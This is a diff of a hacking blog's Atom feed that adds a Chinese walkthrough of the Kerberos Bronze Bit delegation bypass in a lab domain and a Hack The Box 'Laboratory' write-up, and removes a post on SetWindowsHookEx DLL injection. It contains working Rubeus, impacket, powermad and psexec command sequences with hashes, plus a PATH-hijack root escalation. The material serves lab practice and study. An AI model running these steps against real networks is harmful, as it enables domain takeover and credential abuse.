@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2021-03-18T05:37:14.549Z</updated>
+  <updated>2021-03-19T06:44:57.600Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -17,11 +17,33 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>Kerberos Bronze Bit Attack 绕过约束委/资源派限制</title>
+    <link href="http://422926799.github.io/posts/9cf32cdf.html"/>
+    <id>http://422926799.github.io/posts/9cf32cdf.html</id>
+    <published>2021-03-19T06:28:37.000Z</published>
+    <updated>2021-03-19T06:44:57.600Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>该漏洞解决了两个问题<br>1.禁止协议转换/协议过渡<br>2.受保护的用户和敏感用户不能被委派<br>具体设置表现为DC上设置Service1计算机账户为“仅使用Kerberos”而非“使用任何身份验证协议”  </p><h2 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h2><p>DC：WIN-5CHMN9C4UES.YAYI.local (Windows Server 2012)<br>域内两台机器：<br>one2008.YAYI.local (Windows Server 2008)<br>WIN-BMIO66D4K15.YAYI.local (Windows 7)</p><p>域用户:<br>fwwr<br>joke</p><h2 id="传统的约束委派绕过"><a href="#传统的约束委派绕过" class="headerlink" title="传统的约束委派绕过"></a>传统的约束委派绕过</h2><p>服务用户：<br><img src="https://s4.ax1x.com/2021/03/19/6W8P3R.png" alt=""></p><p>委派对象：目标机器WIN-5CHMN9C4UES.YAYI.local<br><img src="https://s4.ax1x.com/2021/03/19/6W8VHO.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/03/19/6W8n4H.png" alt=""></p><p>常规的约束委派利用:</p><pre><code>1. 得到约束委派机器的用户凭证2. 发现委派用户委派的目标机器3. 获取RC4利用</code></pre><p>powerview查看约束委派的机器:</p><pre><code>Get-DomainComputer -TrustedToAuth -Properties distinguishedname,msds-allowedtodelegateto | fl</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6W8f2R.png" alt=""></p><p>Rubeus一条命令实现约束委派：</p><pre><code>Rubeus.exe s4u /user:fwwr /domain:YAYI.local /rc4:ca69e7f0f02d9156d1616ba6abd395b6 /impersonateuser:administrator /msdsspn:&quot;dhcp/WIN-5CHMN9C4UES.YAYI.local/YAYI.local&quot; /altservice:cifs /ptt</code></pre><p>由于用户设置了”敏感用户，不能被委派”，将造成失败<br><img src="https://s4.ax1x.com/2021/03/19/6W8jxI.png" alt=""></p><p>使用新版impacket绕过：（截至最新版本：0.9.22），最低版本要求：（0.9.21）<br>先登录one2008机器用mimikatz获取AES和RC4</p><pre><code>privilege::debugsekurlsa::&quot;ekeys&quot;</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGCdS.png" alt=""></p><p>获取TGT导入smbexec连接</p><pre><code>python3 getST.py -spn cifs/WIN-5CHMN9C4UES.YAYI.local -impersonate administrator -hashes AAD3B435B51404EEAAD3B435B51404EE:0adce35e9d541588782a98fe1fce59cf -aesKey 56f41eb095b4099b27934963200180321742c6f89db55bff02495b22b17afe69 YAYI.local/one2008 -force-forwardableexport KRB5CCNAME=administrator.ccachesudo python3 smbexec.py -no-pass -k WIN-5CHMN9C4UES.YAYI.local</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGkGj.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/03/19/6WGZMq.png" alt=""></p><h2 id="基于资源的约束委派绕过"><a href="#基于资源的约束委派绕过" class="headerlink" title="基于资源的约束委派绕过"></a>基于资源的约束委派绕过</h2><p>先配置环境，首先删除上一步service1的委派权限<br><img src="https://s4.ax1x.com/2021/03/19/6WGKdU.png" alt=""></p><p>用adsi编辑器赋予域用户joke对 one2008写入权限<br><img src="https://s4.ax1x.com/2021/03/19/6WG3W9.png" alt=""></p><p>joke用户可登录WIN-BMIO66D4K15，登录进去后<br>过powermad新加入一个计算机账户AttackerService，密码为AttackerServicePassword</p><pre><code>Import-Module .\powermad.ps1New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString &#39;AttackerServicePassword&#39; -AsPlainText -Force)</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGsSA.png" alt=""></p><p>用mimikatz计算出hash<br><img src="https://s4.ax1x.com/2021/03/19/6WJ961.png" alt=""></p><p>使用PowerShell Active Directory模块添加基于资源的约束委派，即从AttackerService到one2008的传入信任关系。</p><pre><code>Import-Module .\Microsoft.ActiveDirectory.Management.dllGet-ADComputer AttackerService #确认机器账户已经被添加Set-ADComputer one2008 -PrincipalsAllowedToDelegateToAccount AttackerService$ #设置域用户到目标机器Get-ADComputer one2008 -Properties PrincipalsAllowedToDelegateToAccount #查看机器</code></pre><p>验证用户是否成功委派到目标机器</p><pre><code>Get-DomainUser -Identity &lt;user&gt; -Properties objectsid #获取某个用户的SIDGet-DomainObjectAcl -Identity one2008.YAYI.local  | ?{$_.SecurityIdentifier -match &quot;S-1-5-21-2799505025-1944254007-2887416074-1618&quot;} #查询某个机子的ACL</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WJmpd.png" alt=""></p><p>可以看到现在对One2008.YAYI.local有完全的控制权限，直接申请TGT远程连接即可 (这里的RC4和AES key是上面的mimikatz获取的)</p><pre><code>python3 getST.py -spn cifs/one2008.YAYI.local -impersonate administrator -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 537056f14b0f81bc6e4be6ddba7786efdadb813c61ed5a6dce1b YAYI.local/AttackerService -force-forwardableexport KRB5CCNAME=administrator.ccachepython3 psexec.py -no-pass -k one2008.YAYI.local</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WJaXq.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://y4er.com/post/kerberos-bronze-bit-attack/" target="_blank" rel="noopener">https://y4er.com/post/kerberos-bronze-bit-attack/</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;该漏洞解决了两个问题&lt;br&gt;1.禁止协议转换/协议过渡&lt;br&gt;2.受保护的用户和敏感用户不能被委派&lt;br&gt;具体设置表现为DC上设置Servi</summary>
+      
+    
+    
+    
+    
+    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
+    
+  </entry>
+  
+  <entry>
     <title>HTB laboratory</title>
     <link href="http://422926799.github.io/posts/2ee11a81.html"/>
     <id>http://422926799.github.io/posts/2ee11a81.html</id>
     <published>2021-03-18T05:29:21.000Z</published>
-    <updated>2021-03-18T05:37:14.549Z</updated>
+    <updated>2021-03-18T05:37:22.905Z</updated>
     
     <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>常规nmap扫描</p><pre><code>nmap -sC -sV 10.10.10.216</code></pre><p><img src="https://s3.ax1x.com/2021/03/18/6gqiSe.png" alt=""></p><p>从扫描结果能看到，有两个域</p><pre><code>laboratory.htbgit.laboratory.htb</code></pre><p>加入/etc/hosts<br><img src="https://s3.ax1x.com/2021/03/18/6gqFQH.png" alt=""></p><p>访问<code>laboratory.htb</code>发现就一个静态，拉倒下面有三个用户名。先记录下来<br><img src="https://s3.ax1x.com/2021/03/18/6gqAOA.md.png" alt=""></p><p>访问<code>git.laboratory.htb</code>是一个gitlab，注册gitlab发现版本<br>（ps:这里注册gitlab用他域做邮箱域：<a href="mailto:`joker@laboratory.htb" target="_blank" rel="noopener">`joker@laboratory.htb</a>`，不然会注册失败）<br><img src="https://s3.ax1x.com/2021/03/18/6gqeTP.png" alt=""></p><p>![](<a href="https://s3.ax1x.com/2021/03/18/6gqnFf.png" target="_blank" rel="noopener">https://s3.ax1x.com/2021/03/18/6gqnFf.png</a></p><h2 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h2><p>搜索gitlab对应的版本发现存在RCE,msf用对应的利用工具<br><img src="https://s3.ax1x.com/2021/03/18/6gqB6J.png" alt=""></p><p>查看刚刚收集到的用户名，发现Dexter是CEO。修改他的密码<br><img src="https://s3.ax1x.com/2021/03/18/6gqDX9.png" alt=""></p><p>登录它的gitlab发现有id_rsa<br><img src="https://s3.ax1x.com/2021/03/18/6gqsmR.png" alt=""></p><p>ssh连接得到user.txt<br><img src="https://s3.ax1x.com/2021/03/18/6gq46H.png" alt=""></p><p><img src="img/user.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>suid查找发现存在个docker-security。strings查看，发现有执行命令chmod。利用劫持提权</p><pre><code>echo &quot;/bin/bash&quot; &gt; /tmp/chmodchmod 777 /tmp/chmodexport PATH=/tmp:$PATH</code></pre><p><img src="https://s3.ax1x.com/2021/03/18/6gqqtf.png" alt=""></p>]]></content>
     
@@ -444,29 +466,6 @@
     
     
     <category term="数据结构" scheme="http://422926799.github.io/tags/数据结构/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>全局注入研究</title>
-    <link href="http://422926799.github.io/posts/8bc59822.html"/>
-    <id>http://422926799.github.io/posts/8bc59822.html</id>
-    <published>2020-12-27T06:33:16.000Z</published>
-    <updated>2020-12-27T06:50:35.088Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天和朋友聊的时候聊到全局注入，今天打算复现一下</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>参考链接:<a href="https://www.cnblogs.com/DarkBright/p/10835761.html" target="_blank" rel="noopener">https://www.cnblogs.com/DarkBright/p/10835761.html</a></p><h2 id="用到的API函数"><a href="#用到的API函数" class="headerlink" title="用到的API函数"></a>用到的API函数</h2><p>GetMsgProc<br>GetMsgProc与SetWindowsHookEx函数一起使用的应用程序定义或库定义的回调函数。每当GetMessage或PeekMessage函数从应用程序消息队列中检索消息时，系统就会调用此函数。在将检索到的消息返回给调用者之前，系统会将消息传递给挂钩过程。<br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644981(v=vs.85)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644981(v=vs.85)</a></p><p>SetWindowsHookExA<br>将应用程序定义的挂钩过程安装到挂钩链中。您将安装一个挂钩过程来监视系统中的某些类型的事件。这些事件与特定线程或与调用线程在同一桌面上的所有线程相关联。<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa</a></p><p>UnhookWindowsHookEx<br>删除通过SetWindowsHookEx函数安装在挂钩链中的挂钩过程。<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex</a></p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>整体思路：</p><pre><code>1. 声明钩子返回的函数即为GetMsgProc2. 设置钩子要钩住的的事件类型3. 定义要执行的函数4. DLLMain载入DLL的时候定义要执行的code5. 调用dll的LoadHook函数钩住6. 然后dll的HookLoad函数7. 由于载入DLL的时候会先执行DLLMain，所以当前进程会执行DLLMain然后在调用钩子钩住对应的类型，然后在注入dll8. 根据需求卸载钩子</code></pre><p>test.dll<br>导出的函数</p><pre><code>* LoadHook* UnloadHook</code></pre><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;HHOOK g_hook;HMODULE g_module;extern &quot;C&quot; {        __declspec(dllexport) BOOL LoadHook();}extern &quot;C&quot; {        __declspec(dllexport) VOID UnloadHook();}LRESULT CALLBACK GetMsgProc(        _In_ int    code,        _In_ WPARAM wParam,        _In_ LPARAM lParam) {        return CallNextHookEx(g_hook, code, wParam, lParam);}BOOL LoadHook(void) {        g_hook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_module, 0);        if (g_hook) {               MessageBoxA(NULL, &quot;Sucess&quot;, 0, MB_OK);               return TRUE;        }        else {               return FALSE;        }}VOID UnloadHook(void) {        if (g_hook) {               UnhookWindowsHookEx(g_hook);        }}BOOL APIENTRY DllMain(HMODULE hModule,        DWORD  ul_reason_for_call,        LPVOID lpReserved){        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               g_module = hModule;               MessageBox(NULL, TEXT(&quot;加载DLL!&quot;), TEXT(&quot;提示&quot;), MB_OK);               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p>inject.exe</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#define DLL_NAME &quot;test.dll&quot;#define error(name){printf(&quot;Error:%s code:%d&quot;,name,GetLastError());}int main() {        do {               HMODULE hModule = LoadLibraryA(DLL_NAME);               if (hModule == NULL) {                       error(&quot;LoadLibraryA&quot;);                       break;               }               FARPROC pfnLoadHook = GetProcAddress(hModule,&quot;LoadHook&quot;);               FARPROC pfnUnLoadHook = GetProcAddress(hModule, &quot;UnloadHook&quot;);               if (pfnLoadHook == NULL || pfnUnLoadHook == NULL) {                       error(&quot;GetProcAddress&quot;);                       break;               }               if (pfnLoadHook()) {                       printf(&quot;global inject sucess!&quot;);               }else {                       printf(&quot;global inject failure&quot;);                       break;               }               printf(&quot;Enter UnloadHook&quot;);               getchar();               pfnUnLoadHook();        } while (FALSE);        getchar();        return 0;}</code></pre><p>在当前权限所允许的情况下，会多所有能访问的进程钩住注入dll<br><img src="https://s3.ax1x.com/2020/12/27/r56jvn.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/27/r5c32d.png" alt=""></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;昨天和朋友聊的时候聊到全局注入，今天打算复现一下&lt;/p&gt;
-&lt;h2 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;head</summary>
-      
-    
-    
-    
-    
-    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
     
   </entry>
   
